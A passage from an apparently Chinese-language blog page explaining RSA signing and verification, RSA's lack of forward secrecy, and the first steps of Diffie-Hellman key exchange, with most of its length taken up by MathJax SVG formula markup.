153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(989,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1433.7,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1899.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，私钥是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.3ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2342.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(989,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1433.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1953.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>​​。</p></li><li><p><strong>私钥签名</strong>：给定消息 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.378ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 1051 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g></g></g></svg></mjx-container>（其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.378ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 1051 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g></g></g></svg></mjx-container>是一个整数，且<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="10.901ex" height="1.857ex" role="img" focusable="false" viewBox="0 -683 4818.1 821"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(1833.6,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(3162.3,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(4218.1,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>），签名过程为：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.779ex" height="2.61ex" role="img" focusable="false" viewBox="0 -903.7 7416.3 1153.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1037.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2093.6,0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(1138,413) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mtext" transform="translate(3649.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mo" transform="translate(3899.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mtext" transform="translate(4288.3,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mtext" transform="translate(6177.3,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(6427.3,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7027.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p></li><li><p><strong>公钥解密</strong>：给定密文<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.719ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 760 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g></g></svg></mjx-container>，解密过程为：</p></li></ul><p>值得注意的是，<strong>RSA算法并不具有前向安全</strong>，因为它的公私钥是静态的，当黑客长期收集同一个私钥加密的数据时，一旦私钥泄露，那么之前被收集的加密数据均会被破解。</p><h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>DH 算法又称“Diffie–Hellman 算法”，像往常的算法名字一样，这是用俩个数学牛人的名字来命名的算法，<strong>实现安全的密钥交换</strong>，通讯双方在完全没有对方任何预先信息的条件下通过不安全信道创建起一个密钥。</p><p>下面讲一讲算法流程：</p><ol><li>Alice与Bob协定使用一个大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>和一个<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="1.138ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 503 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>的整数模<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>乘法群及其原根<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="3.223ex" height="1.464ex" role="img" focusable="false" viewBox="0 -442 1424.7 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(947.7,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g></g></g></svg></mjx-container>都公开</li><li>Alice选择一个随机数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>（私钥）并计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="12.225ex" height="2.084ex" role="img" focusable="false" viewBox="0 -716 5403.6 921"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1027.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2083.6,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 